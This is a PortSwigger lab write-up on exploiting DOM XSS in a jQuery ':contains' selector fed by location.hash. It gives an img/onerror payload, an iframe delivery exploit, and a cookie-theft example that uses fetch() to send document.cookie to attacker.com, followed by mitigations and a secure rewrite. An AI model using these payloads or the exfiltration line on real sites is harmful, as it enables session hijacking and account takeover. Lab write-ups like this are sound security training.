# Lab 06: DOM XSS in jQuery Selector Sink Using `hashchange` Event

> **Lab URL:** [PortSwigger — DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-jquery-selector-hashchange-event)  
> **Difficulty:** 🟢 Apprentice  
> **Status:** ✅ Solved  
> **Date Solved:** 2026-11-11  
> **Category:** `XSS-Cross-Site-Scripting`

---

## 📋 Lab Description

> This blog lab contains a DOM XSS vulnerability in the home page. The code listens for the `hashchange` event and takes the URL fragment (`location.hash`) and passes it directly into a jQuery selector without escaping:
>
> ```javascript
> $(window).on('hashchange', function(){
>   var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
>   if (post) post.get(0).scrollIntoView();
> });
> ```
>
> To solve the lab, you must inject a payload that calls `print()` (simulates stealing data) when the victim visits the exploit you deliver via the **Exploit Server**.

> **Victim uses Chrome**, so you must deliver the exploit through the Exploit Server — direct navigation with a malicious hash does not auto-execute for the victim.

---

## 🔍 Reconnaissance

### Step 1: Identify the Sink
Open **Inspector → HTML** at the bottom of `/` :

```javascript
<script>
$(window).on('hashchange', function(){
  var post = $('section.blog-list h2:contains(' +
    decodeURIComponent(window.location.hash.slice(1)) + ')');
  if (post) post.get(0).scrollIntoView();
});
</script>
```

| Role | Detail |
|------|--------|
| **Source** | `window.location.hash.slice(1)` → `decodeURIComponent()` (attacker-controlled fragment) |
| **Sink** | `$('section.blog-list h2:contains(' + userInput + ')')` — **jQuery selector sink** |
| **Trigger** | `hashchange` event — fires when `#fragment` changes |

> **Why this is vulnerable:** jQuery parses the string as a CSS/jQuery selector. If you inject `"><img src=x onerror=print()>` it breaks out of `h2:contains('')` and injects HTML/JS.

### Step 2: Understand Server-Side Filtering (Distraction)
Check **Network → Response** for `/post?postId=5` :

```html
<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
```

- Comments are **HTML-encoded** on the server (`&lt;script&gt;` stays text) → Stored XSS is blocked here.
- The real bug is **client-side DOM**, not in comments. Don't waste time on the comment form.

<img width="1280" height="684" alt="Screenshot 2026-11-12 004231" src="https://github.com/user-attachments/assets/d35cb043-c805-411a-88ad-cb13494ded94" />


---

## 🚀 Exploitation

### Step 1: Craft a Standalone Proof 
Visit:
```
https://0a8700bf0476211582042d0010075004c.web-security-academy.net/#<img src=x onerror=print()>
```
- Press Enter → no auto-trigger (needs `hashchange`, not initial load)
- Manually change hash to `#TEST` → then to `#<img src=x onerror=print()>` → `hashchange` fires → `print()` dialog appears.

> This confirms the selector sink executes HTML.

### Step 2: Build a Victim-Triggerable Payload
The victim must **change hash programmatically**. The classic PortSwigger bypass uses an `<iframe>`:

```html
<iframe src="https://0a8700bf0476211582042d0010075004c.web-security-academy.net/#"
        onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**How it works:**
1. `src=".../#"` loads the blog with empty hash.
2. `onload="this.src+=...` appends `<img src=x onerror=print()>` to the fragment.
3. Appending causes `hashchange` event → vulnerable JS runs:
   ```
   $('section.blog-list h2:contains(<img src=x onerror=print()>)')
   ```
   → jQuery injects the `<img>` → `onerror=print()` fires → lab detects `print()` and marks **Solved**.

In Burp's exploit server this is delivered automatically.

### Step 3: Deliver via Exploit Server
Go to **Exploit Server → Craft a response**:

| Field | Value |
|-------|-------|
| **URL** | `https://exploit-0abd004a034216282d93c78017005a.exploit-server.net/exploit` |
| **File** | `/exploit` |
| **Head** | `HTTP/1.1 200 OK` <br> `Content-Type: text/html; charset=utf-8` |
| **Body** | ```html<br><iframe src="https://0a8700bf0476211582042d0010075004c.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe><br>``` |

Click:
1. **Store** → saves exploit at `https://exploit-.../exploit`
2. **View exploit** → test yourself — you should see `print()` dialog.
3. **Deliver exploit to victim** → PortSwigger bot (Chrome) visits `https://exploit-.../exploit` → iframe loads → XSS fires → lab shows:

```
Congratulations, you solved the lab!
```

<img width="1280" height="684" alt="Screenshot 2026-11-12 005752" src="https://github.com/user-attachments/assets/443df8dc-f405-4431-a8f2-287a63b54ee6" />


---

## 📸 Proof of Concept

### 01 — Lab Solved Overview
<img width="1280" height="684" alt="Screenshot 2026-11-12 005321" src="https://github.com/user-attachments/assets/dfa03b5e-9065-467e-a502-adefc0399b16" />


> Final state: `LAB: Solved` badge green + orange "Congratulations, you solved the lab!" banner. Same blog page "WE LIKE TO BLOG" with invisible-man image confirms it's the same lab host.

---

### 02 — Vulnerable Sink: `hashchange` → jQuery `:contains`
<img width="1280" height="684" alt="Screenshot 2026-11-12 004343" src="https://github.com/user-attachments/assets/4a4bdb93-4396-4baa-ba56-958dcbbbf9e4" />


> **Root cause in Inspector.** Highlighted script:
> ```js
> $(window).on('hashchange', function(){
>   var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
>   if (post) post.get(0).scrollIntoView();
> });
> ```
> Source = `location.hash`, Sink = `$('...:contains(...)')`. No escaping → XSS.

---

### 03 — Exploit Server: Iframe Delivery
<img width="1280" height="684" alt="Screenshot 2026-11-12 005218" src="https://github.com/user-attachments/assets/a8831aa3-0416-465b-bbe4-617f5fe84853" />


> **Exploit Server** → Craft a response → Body field contains:
> ```html
> <iframe src="https://0a8700bf0476211582042d0010075004c.web-security-academy.net/#" 
>         onload="this.src+='<img src=x onerror=print()>'"></iframe>
> ```
> This is the payload that triggers `hashchange` for the victim automatically. Click **Store** then **Deliver exploit to victim**.

---

### 04 — Server-Side Filtering (Why Not Stored XSS)
![04-network-comments-filtered](screenshots/04-network-comments-filtered.png)
> Network → Response of `post?postId=5` shows user comment `&lt;script&gt;alert(1)&lt;/script&gt;` is **encoded**. Server is safe, but DOM sink is not. This tells you to focus on `location.hash`, not the comment form.

---

### 05 — Initial State: Before Exploit
<img width="1280" height="684" alt="Screenshot 2026-11-12 005321" src="https://github.com/user-attachments/assets/4b860eec-a573-4a3e-8f95-9b6a00b657c6" />

> `/` before exploit: `LAB: Not solved` (top right), "Go to exploit server" button visible. Same blog list — this is the baseline to compare with solved screenshot #01.

---

## 🧠 Key Takeaways

### 1. Root Cause
- **Unsafe jQuery selector construction:** `':contains(' + userInput + ')'` treats `userInput` as code, not text.
- `decodeURIComponent(window.location.hash.slice(1))` is fully attacker-controlled and never sanitized.
- `hashchange` is a common DOM XSS vector — payload only executes after fragment changes.

### 2. Why `print()` and Not `alert()`?
- PortSwigger uses `print()` to simulate exfiltration without popup blockers. In real world, attacker would use:
> ```js
> <img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">
> ```

### 3. Impact
- **Session hijack / account takeover** if victim is logged in (cookies exfiltrated via XSS).
- **Defacement / phishing** inside the blog domain (trusted origin).

---

## 🛡️ Mitigation

| Fix | Implementation |
|-----|---------------|
| **Avoid selector sink** | Don't concatenate `location.hash` into `$()`. Use `document.getElementById(hash)` or `querySelector` with `CSS.escape(hash)`. |
| **Escape for :contains** | If you must use `:contains`, use `$.escapeSelector()` (jQuery 3.x) or manual allow-list: `hash.replace(/[^a-zA-Z0-9 ]/g,'')` |
| **Safe alternative** | ```js<br>let id = decodeURIComponent(location.hash.slice(1));<br>let el = document.getElementById(id);<br>if (el) el.scrollIntoView();<br>``` |
| **CSP** | `Content-Security-Policy: script-src 'self'` blocks inline `onerror` handlers. |
| **Trusted Types + Sanitization** | Enforce DOMPurify or Trusted Types for any DOM insertion. |

**Secure rewrite:**
```javascript
$(window).on('hashchange', function(){
  let raw = decodeURIComponent(window.location.hash.slice(1));
  // Allow only alphanumeric + spaces (your blog titles)
  if (!/^[a-zA-Z0-9 ]+$/.test(raw)) return;
  let post = $('section.blog-list h2:contains(' + $.escapeSelector(raw) + ')');
  if (post.length) post[0].scrollIntoView();
});
```

---

## 📚 References

- [PortSwigger — DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [Lab: DOM XSS in jQuery selector sink using hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-jquery-selector-hashchange-event)
- [jQuery `escapeSelector` docs](https://api.jquery.com/jQuery.escapeSelector/)
- [OWASP DOM XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

---



> 📝 **Author:** Saber Hasan Swoyon   
> 🛠️ **Tools:** Kali Linux (VirtualBox) + Firefox + FoxyProxy + DevTools (Inspector/Network), PortSwigger Exploit Server  
> ⚠️ **Disclaimer:** Tested only on PortSwigger's intentionally vulnerable lab in an authorized training environment.
